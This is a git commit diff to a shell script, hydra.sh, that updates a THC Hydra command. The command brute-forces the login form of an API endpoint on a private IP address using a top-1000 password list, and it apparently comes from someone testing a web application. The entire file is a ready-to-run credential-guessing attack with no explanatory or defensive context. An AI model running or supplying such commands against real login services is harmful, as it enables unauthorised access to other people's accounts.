6476b08eac0c257875a968b18009cb6685c3048b
Jac <121095246+JacintaSyilloam@users.noreply.github.com>
2024-12-27 21:27:24 +0700

    Update hydra.sh

--- hydra.sh
+++ hydra.sh
@@ -1,1 +1,1 @@
-hydra -l admin@mail.com -P ~/Desktop/10-million-password-list-top-1000.txt http-post-form "/api/v1/auth/login:{"user_email": "test@mail.com","user_password": "^PASS^"}:F=An Error Occurred" -V -s 80 http://192.168.1.78
+hydra -l admin@mail.com -P 10-million-password-list-top-1000.txt 192.168.1.78 http-post-form "/api/v1/auth/login:user_email=test@mail.com&user_password=^PASS^:An Error Occurred" -t 4 -V
